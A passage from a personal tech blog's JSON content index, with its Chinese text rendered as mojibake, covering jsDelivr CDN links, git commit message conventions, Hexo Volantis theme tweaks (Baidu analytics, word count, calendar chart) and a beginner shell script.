ç‰ˆæœ¬å·ä¸æ˜¯å¿…éœ€çš„ï¼Œæ˜¯ä¸ºäº†åŒºåˆ†æ–°æ—§èµ„æºï¼Œå¦‚æœä¸ä½¿ç”¨ç‰ˆæœ¬å·ï¼Œå°†ä¼šç›´æ¥å¼•ç”¨æœ€æ–°èµ„æºï¼Œé™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥ä½¿ç”¨æŸä¸ªèŒƒå›´å†…çš„ç‰ˆæœ¬ï¼ŒæŸ¥çœ‹æ‰€æœ‰èµ„æºç­‰ï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š 123456789101112131415&#x2F;&#x2F; é€šè¿‡æŒ‡å®šç‰ˆæœ¬å·å¼•ç”¨https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;0xAiKang&#x2F;CDN&#x2F;blog&#x2F;images&#x2F;avatar.jpg&#x2F;&#x2F; ä½¿ç”¨ä¸€ä¸ªèŒƒå›´å†…çš„ç‰ˆæœ¬https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;dist&#x2F;jquery.min.js&#x2F;&#x2F; å¿½ç•¥ç‰ˆæœ¬å·åˆ™é»˜è®¤ä½¿ç”¨æœ€æ–°ç‰ˆhttps:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F;dist&#x2F;jquery.min.js&#x2F;&#x2F; åœ¨ä»»æ„JS&#x2F;CSSæ–‡ä»¶åæ·»åŠ  .min èƒ½å¾—åˆ°ä¸€ä¸ªç¼©å°ç‰ˆ&#x2F;&#x2F; å¦‚æœå®ƒæœ¬èº«ä¸å­˜åœ¨ï¼Œæˆ‘ä»¬å°†ä¼šä¸ºä½ ç”Ÿæˆhttps:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;src&#x2F;core.min.js&#x2F;&#x2F; åœ¨æœ«å°¾åŠ  &#x2F; åˆ™å¾—åˆ°ç›®å½•åˆ—è¡¨https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F; åŒæ ·çš„ä¸€å¼ å›¾ç‰‡ï¼Œå¯ä»¥å¯¹æ¯”ä¸€ä¸‹jsDeliverå’Œraw.githubusercontent çš„è®¿é—®é€Ÿåº¦ã€‚ jsDeliverï¼šhttps://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/avatar.jpg raw.githubusercontentï¼šhttps://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/avatar.jpg","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"GitHub","slug":"Tutorial/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/GitHub/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"}]},{"title":"å¦‚ä½•å†™å¥½Commit log","slug":"how-to-write-a-commit-log","date":"2020-07-10T01:22:51.000Z","updated":"2020-07-10T01:23:51.811Z","comments":true,"path":"how-to-write-a-commit-log/","link":"","permalink":"https://www.0x2beace.com/how-to-write-a-commit-log/","excerpt":"å…¶å®å…³äºè¿™ä¸ªé—®é¢˜ï¼Œè€æ—©éƒ½æƒ³æ•´ç†äº†ï¼Œåªæ˜¯ä¸€ç›´æ²¡æœ‰è…¾å‡ºç©ºæ¥ã€‚æœ€è¿‘åˆšå¥½æœ‰ç©ºï¼Œç´¢æ€§æ•´ç†äº†ä¸‹ã€‚ è¿™é‡Œå°±ä¸è¿‡å¤šä»‹ç»ä»€ä¹ˆæ˜¯Gitäº†ï¼Œæœ¬æ–‡çš„é‡ç‚¹æ˜¯Commit Logï¼Œå¦‚æœè¿˜ä¸æ¸…æ¥šGitæ˜¯ä»€ä¹ˆï¼Œå¯ä»¥çœ‹ä¸€ä¸‹æˆ‘çš„Gitç³»åˆ—çš„å…¶ä»–ç¬”è®°ã€‚","text":"å…¶å®å…³äºè¿™ä¸ªé—®é¢˜ï¼Œè€æ—©éƒ½æƒ³æ•´ç†äº†ï¼Œåªæ˜¯ä¸€ç›´æ²¡æœ‰è…¾å‡ºç©ºæ¥ã€‚æœ€è¿‘åˆšå¥½æœ‰ç©ºï¼Œç´¢æ€§æ•´ç†äº†ä¸‹ã€‚ è¿™é‡Œå°±ä¸è¿‡å¤šä»‹ç»ä»€ä¹ˆæ˜¯Gitäº†ï¼Œæœ¬æ–‡çš„é‡ç‚¹æ˜¯Commit Logï¼Œå¦‚æœè¿˜ä¸æ¸…æ¥šGitæ˜¯ä»€ä¹ˆï¼Œå¯ä»¥çœ‹ä¸€ä¸‹æˆ‘çš„Gitç³»åˆ—çš„å…¶ä»–ç¬”è®°ã€‚ ä¸ºä»€ä¹ˆè¦å…³æ³¨æäº¤ä¿¡æ¯ åŠ å¿«Reviewing Codeçš„è¿‡ç¨‹ æé†’è‡ªå·±æˆ–ä»–äººï¼ŒæŸä¸ªæäº¤å…·ä½“å¢åŠ äº†ä»€ä¹ˆåŠŸèƒ½ï¼Œæ”¹åŠ¨äº†å“ªäº›åœ°æ–¹ æé«˜é¡¹ç›®çš„æ•´ä½“è´¨é‡ Angular è§„èŒƒçš„ Commit message æ ¼å¼è¿™ç§æ ¼å¼ï¼ˆè§„èŒƒï¼‰æ˜¯æˆ‘ç›®å‰è§‰å¾—ç›¸å¯¹å…¶ä»–æ ¼å¼ï¼ˆè§„èŒƒï¼‰è€Œè¨€ï¼Œæœ€å®¹æ˜“æ¥å—ã€ä¸Šæ‰‹çš„ä¸€ç§ã€‚ å…¶æ ¸å¿ƒæ˜¯æ¯æ¬¡æäº¤ï¼ŒCommit message éƒ½åŒ…æ‹¬ä¸‰ä¸ªéƒ¨åˆ†ï¼šHeaderï¼ŒBody å’Œ Footerã€‚ 12345&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;&#x2F;&#x2F; ç©ºä¸€è¡Œ&lt;body&gt;&#x2F;&#x2F; ç©ºä¸€è¡Œ&lt;footer&gt; å…¶ä¸­ï¼ŒHeader æ˜¯å¿…éœ€çš„ï¼ŒBody å’Œ Footer å¯ä»¥çœç•¥ã€‚ HeaderHeader éƒ¨åˆ†åªæœ‰ä¸€è¡Œï¼ŒåŒ…æ‹¬ä¸‰ä¸ªå­—æ®µï¼štypeï¼ˆå¿…éœ€ï¼‰ã€scopeï¼ˆå¯é€‰ï¼‰å’Œ subjectï¼ˆå¿…éœ€ï¼‰ã€‚ type ç”¨äºè¯´æ˜ commit çš„ç±»åˆ«ï¼Œåªå…è®¸ä½¿ç”¨ä¸‹é¢ 7 ä¸ªæ ‡è¯†ã€‚ feat æ–°åŠŸèƒ½ï¼ˆfeatureï¼‰ fix ä¿®è¡¥ bug docs æ–‡æ¡£ï¼ˆdocumentationï¼‰ style æ ¼å¼ï¼ˆä¸å½±å“ä»£ç è¿è¡Œçš„å˜åŠ¨ï¼‰ refactor é‡æ„ï¼ˆå³ä¸æ˜¯æ–°å¢åŠŸèƒ½ï¼Œä¹Ÿä¸æ˜¯ä¿®æ”¹ bug çš„ä»£ç å˜åŠ¨ï¼‰ test å¢åŠ æµ‹è¯• chore æ„å»ºè¿‡ç¨‹ã€è¾…åŠ©å·¥å…·çš„å˜åŠ¨ perf æé«˜æ€§èƒ½ typo æ‰“å­—é”™è¯¯ scope ç”¨äºè¯´æ˜ commit å½±å“çš„èŒƒå›´ï¼Œæ¯”å¦‚æ•°æ®å±‚ã€æ§åˆ¶å±‚ã€è§†å›¾å±‚ç­‰ç­‰ï¼Œè§†é¡¹ç›®ä¸åŒè€Œä¸åŒã€‚ subject æ˜¯ commit ç›®çš„çš„ç®€çŸ­æè¿°ï¼Œä¸è¶…è¿‡ 50 ä¸ªå­—ç¬¦ã€‚ BodyBody éƒ¨åˆ†æ˜¯å¯¹æœ¬æ¬¡ commit çš„è¯¦ç»†æè¿°ï¼Œå¯ä»¥åˆ†æˆå¤šè¡Œã€‚ FooterFooter éƒ¨åˆ†åªç”¨äºä¸å…¼å®¹å˜åŠ¨å’Œå…³é—­ Issueã€‚ æ€»ç»“æœ¬æ¥æˆ‘è‡ªå·±ä¸€ç›´ä½¿ç”¨çš„æ–¹å¼å°±æ˜¯ï¼šgit commit -am &quot;fix login bugï¼Œè™½ç„¶å¹¶æ²¡æœ‰ç»å¯¹çš„å¯¹é”™ï¼Œä½†è¿™æ˜¾ç„¶ä¸æ˜¯æœ€å¥½çš„æ–¹å¼ã€‚ è¿™ç§ä¸œè¥¿å¹¶æ²¡æœ‰å¼ºåˆ¶æ€§çš„è§„å®šï¼Œåªè¦å›¢é˜Ÿä¹‹é—´çº¦å®šå¥½ï¼Œç„¶åæŒ‰ç…§è¿™ä¸ªçº¦å®šåä½œå°±å¥½äº†ã€‚ æ‰€ä»¥æˆ‘è§‰å¾—åœ¨å›¢é˜Ÿä¹‹é—´commitæ—¶ï¼Œå¯ä»¥ä¸ç”¨å®Œå…¨æŒ‰ç…§Angular è§„èŒƒçš„Commit messageæ ¼å¼å»æäº¤ï¼Œå¯ä»¥æŒ‰ç…§ä»¥ä¸‹çº¦å®šæ¥æ‰§è¡Œã€‚ commitæ—¶ï¼Œåªç”¨ä¿ç•™ Header éƒ¨åˆ†å°±å¥½ã€‚ pull requestæ—¶ï¼Œæ‰éœ€è¦ Headerã€Bodyã€Footer è¿™ä¸‰éƒ¨åˆ†ã€‚ å¦å¤–commitæ—¶éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š åˆ›å»ºçŸ­å°è€Œæ˜ç¡®çš„commitï¼Œä¸€å¥è¯è¯´æ¸…æ¥šã€‚ ä¸€ä¸ªå°æ”¹åŠ¨å¯¹åº”ä¸€æ¬¡commitï¼Œä¸å»ºè®®ä¸€å¤§å †æ”¹åŠ¨ï¼Œä¸€æ¬¡commitã€‚ å¦‚æœæ·»åŠ çš„ä»£ç ä¼šä½¿é¡¹ç›®å‘ç”Ÿæå¤§çš„å˜åŒ–ï¼Œé‚£ä¹ˆéœ€è¦åŠæ—¶æ›´æ–°remadeæ–‡ä»¶ä»¥å‘ä»–äººè¯´æ˜æ­¤æ¬¡æ›´æ”¹ã€‚ æœ€ä½³å®è·µ123docs: add FAQ in readme filefeat: increase user login functionfix: fix user login bug å‚è€ƒé“¾æ¥ Git å¦‚ä½•å†™å¥½ Commit Logï¼Ÿ","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Hexo Volantis ä¸»é¢˜ä¼˜åŒ– | å¢åŠ åˆ†æä¸ç»Ÿè®¡","slug":"hexo-volantis-theme-optimization-add-analysis-and-statistics","date":"2020-07-09T13:14:37.000Z","updated":"2020-07-09T13:19:08.344Z","comments":true,"path":"hexo-volantis-theme-optimization-add-analysis-and-statistics/","link":"","permalink":"https://www.0x2beace.com/hexo-volantis-theme-optimization-add-analysis-and-statistics/","excerpt":"Volantis é»˜è®¤æ”¯æŒ ä¸è’œå­ çš„è®¿é—®ç»Ÿè®¡ï¼Œå¯ä»¥è‡ªè¡Œæ·»åŠ ç™¾åº¦ç»Ÿè®¡å’Œ Google Analyticsã€‚","text":"Volantis é»˜è®¤æ”¯æŒ ä¸è’œå­ çš„è®¿é—®ç»Ÿè®¡ï¼Œå¯ä»¥è‡ªè¡Œæ·»åŠ ç™¾åº¦ç»Ÿè®¡å’Œ Google Analyticsã€‚ ç¯å¢ƒè¦æ±‚ Hexoï¼š4.2 Nodeï¼š12 Volantisï¼š2.6 åˆ†æä¸ç»Ÿè®¡å­—æ•°å’Œé˜…è¯»æ—¶é•¿ Volantis é»˜è®¤æ²¡æœ‰å®‰è£… wordcountæ’ä»¶ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨å®‰è£…ï¼š 1npm i --save hexo-wordcount ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶themes/volantis/_config.ymlï¼Œå°† wordcount æ’ä»¶æ‰“å¼€ 12345plugins: ... # æ–‡ç« å­—æ•°ç»Ÿè®¡ã€é˜…è¯»æ—¶é•¿ï¼Œå¼€å¯éœ€è¦å®‰è£…æ’ä»¶: npm i --save hexo-wordcount wordcount: true ç»§ç»­ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶themes/volantis/_config.ymlï¼Œå°† wordcount æ”¾åœ¨éœ€è¦æ˜¾ç¤ºçš„ meta ä½ç½®ï¼š 12345678# å¸ƒå±€layout: on_list: meta: [..., wordcount, ...] on_page: meta: header: [..., wordcount, ...] footer: [..., wordcount, ...] ç™¾åº¦ç»Ÿè®¡ç™¾åº¦ç»Ÿè®¡æ˜¯ç™¾åº¦æ¨å‡ºçš„ä¸€æ¬¾å…è´¹çš„ä¸“ä¸šç½‘ç«™æµé‡åˆ†æå·¥å…·ï¼Œèƒ½å¤Ÿå‘Šè¯‰ç”¨æˆ·è®¿å®¢æ˜¯å¦‚ä½•æ‰¾åˆ°å¹¶æµè§ˆç”¨æˆ·çš„ç½‘ç«™ï¼Œåœ¨ç½‘ç«™ä¸Šåšäº†äº›ä»€ä¹ˆï¼Œéå¸¸æœ‰è¶£ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æŠŠç™¾åº¦ç»Ÿè®¡æ·»åŠ åˆ°è‡ªå·±åšå®¢å½“ä¸­ã€‚ è®¿é—®ç™¾åº¦ç»Ÿè®¡é¦–é¡µï¼Œæ³¨å†Œä¸€ä¸ªè´¦å·åç™»é™†ï¼Œæ·»åŠ ä½ çš„åšå®¢ç½‘ç«™ã€‚ ç‚¹å‡»è·å–ä»£ç ï¼Œå¤åˆ¶è¯¥ä»£ç ã€‚ åœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­ï¼Œå¢åŠ ä»¥ä¸‹å†…å®¹ï¼š 1cnzz: true ç”¨äºè®¾ç½®æ˜¯å¦å¼€å¯ç™¾åº¦ç»Ÿè®¡ã€‚ åœ¨themes/volantis/layout/_partialç›®å½•ä¸‹ï¼Œæ–°å»ºä¸€ä¸ªcnzz.ejsæ–‡ä»¶ï¼Œå°†åˆšæ‰å¤åˆ¶çš„å†…å®¹ç²˜è´´è¿›å»ï¼š 1234567891011&lt;% if (theme.cnzz)&#123; %&gt;&lt;script&gt; var _hmt &#x3D; _hmt || []; (function () &#123; var hm &#x3D; document.createElement(&quot;script&quot;); hm.src &#x3D; &quot;https:&#x2F;&#x2F;hm.baidu.com&#x2F;hm.js?xxxxxxxxxxxxxxxxxxxxxxx&quot;; var s &#x3D; document.getElementsByTagName(&quot;script&quot;)[0]; s.parentNode.insertBefore(hm, s); &#125;)();&lt;&#x2F;script&gt;&lt;% &#125; %&gt; æœ€åå°†ä»¥ä¸‹å†…å®¹æ”¾åœ¨ç½‘ç«™é¦–é¡µçš„å°¾éƒ¨themes/volantis/layout/_partial/footer.ejsä¸­ï¼š 1&lt;%- partial(&#39;cnzz&#39;) %&gt; å®Œæˆä»¥ä¸Šæ‰€æœ‰æ“ä½œä¹‹åï¼Œå¯ä»¥åœ¨ç™¾åº¦ç»Ÿè®¡ç®¡ç†é¡µé¢æ£€æŸ¥ä»£ç æ˜¯å¦å®‰è£…æ­£ç¡®ï¼Œå¦‚æœæ­£ç¡®å®‰è£…ï¼Œé€šå¸¸äºŒååˆ†é’Ÿä¹‹åå°±å¯ä»¥çœ‹åˆ°ç½‘ç«™çš„åˆ†ææ•°æ®äº†ã€‚","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"}]},{"title":"Hexo Volantis ä¸»é¢˜ä¼˜åŒ– | æ·»åŠ æ—¥å†å›¾","slug":"hexo-volantis-theme-optimization-add-calendar","date":"2020-07-09T13:07:08.000Z","updated":"2020-07-09T13:12:15.183Z","comments":true,"path":"hexo-volantis-theme-optimization-add-calendar/","link":"","permalink":"https://www.0x2beace.com/hexo-volantis-theme-optimization-add-calendar/","excerpt":"ä¸€ç›´è§‰å¾—GitHub æ—¥å†å›¾ï¼ˆä»£ç æäº¤ç»Ÿè®¡æ ·å¼ï¼‰å¾ˆå¥½çœ‹ï¼Œå¶ç„¶å‘ç°æ˜¯å¯ä»¥é€šè¿‡é…ç½®å°†æ—¥å†æ¨¡å—å¼•å…¥åˆ°Hexo çš„ä¸»é¢˜ä¸­çš„ã€‚ é»˜è®¤æ•ˆæœå¦‚ä¸‹ï¼š å› ä¸ºæˆ‘ä½¿ç”¨çš„Hexo ä¸»é¢˜æ˜¯Volantisã€è€Œè¯¥ä¸»é¢˜ç›®å‰å¹¶æ²¡æœ‰é›†æˆè¯¥æ§ä»¶ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨é…ç½®ã€‚","text":"ä¸€ç›´è§‰å¾—GitHub æ—¥å†å›¾ï¼ˆä»£ç æäº¤ç»Ÿè®¡æ ·å¼ï¼‰å¾ˆå¥½çœ‹ï¼Œå¶ç„¶å‘ç°æ˜¯å¯ä»¥é€šè¿‡é…ç½®å°†æ—¥å†æ¨¡å—å¼•å…¥åˆ°Hexo çš„ä¸»é¢˜ä¸­çš„ã€‚ é»˜è®¤æ•ˆæœå¦‚ä¸‹ï¼š å› ä¸ºæˆ‘ä½¿ç”¨çš„Hexo ä¸»é¢˜æ˜¯Volantisã€è€Œè¯¥ä¸»é¢˜ç›®å‰å¹¶æ²¡æœ‰é›†æˆè¯¥æ§ä»¶ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨é…ç½®ã€‚ ç¯å¢ƒè¦æ±‚ Hexoï¼š4.2 Nodeï¼š12 Volantisï¼š2.6 Volantis ä½ç‰ˆæœ¬å¯èƒ½ä¼šä¸é€‚ç”¨äºæœ¬æ–‡ä»‹ç»çš„æ–¹æ³•ï¼Œå¯ä»¥å‚è€ƒ YINUXY çš„ Hexoä¸»é¢˜ç¾åŒ– | ç»™ä½ çš„åšå®¢åŠ ä¸ŠGITHUBæ—¥å†äº‘å’Œåˆ†ç±» é…ç½® åœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶ themes\\volantis\\_config.yml ä¸‹æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š 1postCalendar: true ç”¨äºè®¾ç½®åœ¨å½’æ¡£é¡µé¢ä¸­æ˜¯å¦æ˜¾ç¤ºâ€™æ–‡ç« æ—¥å†â€™æ§ä»¶ï¼Œå¦‚æœä¸æƒ³æ˜¾ç¤ºï¼Œè®¾ç½®ä¸º false å³å¯ã€‚ åœ¨å½’æ¡£é¡µé¢ themes/volantis/layout/archive.ejs æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š 12345&lt;div id&#x3D;&quot;calendar&quot;&gt; &lt;% if (theme.postCalendar) &#123; %&gt; &lt;%- partial(&#39;_widget&#x2F;post-calendar&#39;) %&gt; &lt;% &#125; %&gt;&lt;&#x2F;div&gt; å…·ä½“æ·»åŠ ä½ç½®ï¼š è¿™é‡Œä¼šæ ¹æ®ä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­çš„postCalendarçš„å€¼ï¼Œæ¥åˆ¤æ–­æ˜¯å¦éœ€è¦æ¸²æŸ“ã€‚ ç‚¹å‡»ä¸‹è½½æ—¥å†æ ·å¼æ–‡ä»¶ post-calendar.ejsï¼Œæ”¾ç½®äºthemes/volantis/layout/_widgetç›®å½•ä¸‹ã€‚ å°†å…¶ä¸­çš„ç¬¬ 16 è¡Œï¼Œæ›¿æ¢æˆä»¥ä¸‹å†…å®¹ï¼š 1&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;0xAiKang&#x2F;CDN@1.0&#x2F;blog&#x2F;js&#x2F;echarts.min.js&quot;&gt;&lt;&#x2F;script&gt; è‡³æ­¤å·²ç»å®Œæˆäº†ï¼Œä½¿ç”¨hexo generate &amp;&amp; hexo serveræŸ¥çœ‹æ˜¯å¦å¯ä»¥æ­£å¸¸åŠ è½½æ—¥å†å›¾ã€‚ é»˜è®¤çš„æ ·å¼æ˜¯é«˜ä»¿gitteeï¼Œå¦‚æœè§‰å¾—ä¸æ»¡æ„ï¼Œå¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£è‡ªå®šä¹‰ã€‚ å‚è€ƒé“¾æ¥ hexoï¼ˆsakuraï¼‰ä»¿giteeæ·»åŠ æ–‡ç« è´¡çŒ®åº¦æ—¥å†å›¾ï¼ˆechartsï¼‰","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"}]},{"title":"ç¼–å†™ç¬¬ä¸€ä¸ªShell è„šæœ¬","slug":"write-the-first-shell-script","date":"2020-07-08T13:56:46.000Z","updated":"2020-07-08T13:59:47.029Z","comments":true,"path":"write-the-first-shell-script/","link":"","permalink":"https://www.0x2beace.com/write-the-first-shell-script/","excerpt":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•ç¼–å†™ Shell è„šæœ¬è¿‡ç¨‹ä¸­çš„ä¸€äº›åŸºç¡€çŸ¥è¯†ã€‚","text":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•ç¼–å†™ Shell è„šæœ¬è¿‡ç¨‹ä¸­çš„ä¸€äº›åŸºç¡€çŸ¥è¯†ã€‚ ä»€ä¹ˆæ˜¯ shell è„šæœ¬ Shell è„šæœ¬å°±æ˜¯å°†ä¸€å †çš„ Shell å‘½ä»¤ä»¥åŠæŒ‡å®šæ‰§è¡Œ Shell ï¼Œé€šè¿‡æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­æ¥æ‰§è¡Œã€‚ åˆ›å»ºç¬¬ä¸€ä¸ªshell è„šæœ¬ä¸‹é¢æˆ‘ä»¬æ¥åˆ›å»ºç¬¬ä¸€ä¸ª shell è„šæœ¬ï¼š 123456$ vim showdate#! &#x2F;bin&#x2F;bash# this script displays the date and who&#39;s logged ondatewho å¤§åŠŸå‘Šæˆï¼è¿™æ ·å°±å®Œæˆäº†ä¸€ä¸ªç®€å•çš„ shell è„šæœ¬çš„åˆ›å»ºï¼Œæ˜¯ä¸æ˜¯å¾ˆç®€å•ï¼ä¸è¿‡æœ‰ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š shell è„šæœ¬çš„åç§°ä¸æ˜¯ä¸€å®šéœ€è¦ç”¨ .sh æ¥ç»“å°¾ï¼Œåªæ˜¯ç”¨ .sh ç»“å°¾ä¼šè®©å…¶ä»–äººä¸€ç›®äº†ç„¶çŸ¥é“è¿™æ˜¯ä¸€ä¸ª shell è„šæœ¬æ–‡ä»¶ã€‚ åœ¨åˆ›å»ºshell è„šæœ¬æ—¶ï¼Œå¿…é¡»åœ¨ç¬¬ä¸€è¡ŒæŒ‡å®šè¦ä½¿ç”¨çš„ shellï¼Œä¸”æ ¼å¼å›ºå®šä¸ºï¼š#!å¼€å¤´ã€‚ ç¬¬äºŒè¡Œçš„äº•å·ä½œä¸ºæ³¨é‡Šè¡Œã€‚ è¿è¡Œshell è„šæœ¬ï¼š 12345678$ lsshowdate$ .&#x2F;showdatebash: permission denied: .&#x2F;showdate$ sudo .&#x2F;showdatesudo: .&#x2F;showdate: command not found$ chmod u+x showdate$ .&#x2F;showdate åˆ›å»ºå®Œ shell è„šæœ¬ï¼Œæƒ³è¦è¿è¡Œï¼Œæœ‰ä¸¤ç§æ–¹æ¡ˆï¼š å°† shell è„šæœ¬æ‰€å¤„çš„ç›®å½•æ·»åŠ åˆ° PATH ç¯å¢ƒå˜é‡ä¸­; åœ¨æç¤ºç¬¦ä¸­ç”¨ç»å¯¹è·¯å¾„æˆ–è€…æ˜¯ç›¸å¯¹è·¯å¾„æ¥å¼•ç”¨ shell è„šæœ¬æ–‡ä»¶; åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œç”¨çš„æ˜¯ç»å¯¹è·¯å¾„çš„æ–¹å¼æ¥æ‰§è¡Œshell è„šæœ¬ï¼Œä½¿ç”¨å•ç‚¹æ“ä½œç¬¦è¡¨ç¤ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå› ä¸ºæ–‡ä»¶å¤¹æƒé™çš„å…³ç³»ï¼Œè€Œä¸èƒ½ç›´æ¥ç”¨ sudo å‘½ä»¤å»æ‰§è¡Œï¼Œå› ä¸ºsudo å‘½ä»¤ä¼šæ£€æŸ¥showdate å¹¶ä¸åœ¨sudo å‘½ä»¤åˆ—è¡¨ä¸­ã€‚ æ‰€ä»¥æ­£è§£æ˜¯ï¼šä¿®æ”¹è¯¥æ–‡ä»¶çš„æ–‡ä»¶å¤¹æƒé™ã€‚","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"Linux/å­¦ä¹ ç¬”è®°","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"å¯¹äºShellç¼–ç¨‹çš„ç†è§£","slug":"understanding-of-shell-programming","date":"2020-07-08T13:45:40.000Z","updated":"2020-07-08T13:55:36.897Z","comments":true,"path":"understanding-of-shell-programming/","link":"","permalink":"https://www.0x2beace.com/understanding-of-shell-programming/","excerpt":"åœ¨å¼€å§‹èŠShellç¼–ç¨‹ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹è®¡ç®—æœºç¼–ç¨‹è¯­è¨€çš„éƒ½æœ‰å“ªäº›ç±»å‹ã€‚ è®¡ç®—æœºè¯­è¨€å¯ä»¥åˆ†ä¸ºä¸¤å¤§ç±»ï¼š ä½çº§è¯­è¨€ é«˜çº§è¯­è¨€","text":"åœ¨å¼€å§‹èŠShellç¼–ç¨‹ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹è®¡ç®—æœºç¼–ç¨‹è¯­è¨€çš„éƒ½æœ‰å“ªäº›ç±»å‹ã€‚ è®¡ç®—æœºè¯­è¨€å¯ä»¥åˆ†ä¸ºä¸¤å¤§ç±»ï¼š ä½çº§è¯­è¨€ é«˜çº§è¯­è¨€ ä½çº§è¯­è¨€åŒ…æ‹¬ï¼šæœºå™¨è¯­è¨€å’Œæ±‡ç¼–è¯­è¨€ã€‚ é«˜çº§è¯­è¨€åŒ…æ‹¬ï¼šé™æ€è¯­è¨€å’ŒåŠ¨æ€è¯­è¨€ã€‚ è¿™é‡Œå°±ä¸å¯¹æœºå™¨è¯­è¨€å’Œæ±‡ç¼–è¯­è¨€åšä»‹ç»äº†ï¼Œä»Šå¤©çš„ä¸»è§’æ˜¯é«˜çº§è¯­è¨€ä¸‹çš„åŠ¨æ€è¯­è¨€ã€‚ åŠ¨æ€è¯­è¨€åŠ¨æ€è¯­è¨€åˆå«åšè„šæœ¬è¯­è¨€ã€‚ å®ƒå’Œä¼ ç»Ÿçš„é™æ€è¯­è¨€çš„åŒºåˆ«å°±åœ¨äº: 12å‰è€…çš„è¿è¡Œè¿‡ç¨‹ä¸ºï¼šç¼–å†™-&gt;è§£é‡Š-&gt;æ‰§è¡Œè€Œåè€…çš„è¿è¡Œè¿‡ç¨‹ä¸ºï¼šç¼–å†™-&gt;ç¼–è¯‘-&gt;é“¾æ¥-&gt;æ‰§è¡Œ è„šæœ¬è¯­è¨€çš„ä¼˜åŠ¿å°±åœ¨äº åªè¦æœ‰ä¸€ä¸ªå¯ä»¥å†™ä»£ç çš„ç¼–è¾‘å™¨å’Œèƒ½è§£é‡Šæ‰§è¡Œçš„è„šæœ¬è§£é‡Šå™¨å°±è¡Œäº†ã€‚ è¿™æ ·ä¸€æƒ³ï¼Œä¹Ÿå°±æ˜ç™½äº†ä¸ºä»€ä¹ˆæ­å»ºPythonçš„å¼€å‘ç¯å¢ƒè¿œæ¯”C#è¦å¿«ï¼Œå› ä¸ºå®ƒåªè¦å®‰è£…ä¸€ä¸ªè§£é‡Šå™¨å°±å¥½äº†ã€‚ åŠ¨æ€è¯­è¨€ä¸é™æ€è¯­è¨€å­˜åœ¨çš„äº‰è®®ä¹‹ä¸€ï¼š åœ¨é™æ€è¯­è¨€ä¸­ï¼Œå†™ä»£ç æ—¶å¿…é¡»çŸ¥é“æ¯ä¸ªå˜é‡çš„ç±»å‹; è€Œåœ¨åŠ¨æ€è¯­è¨€ä¸­ï¼Œéšä¾¿ä»€ä¹ˆæ—¶å€™ï¼Œä½ éƒ½å¯ä»¥æŠŠå˜é‡è®¾ä¸ºä»»æ„ç±»å‹çš„å€¼ã€‚ Shellç¼–ç¨‹æœ€åˆåœ¨å­¦ä¹ Shellè„šæœ¬æ—¶ï¼Œäº§ç”Ÿè¿‡è¿™æ 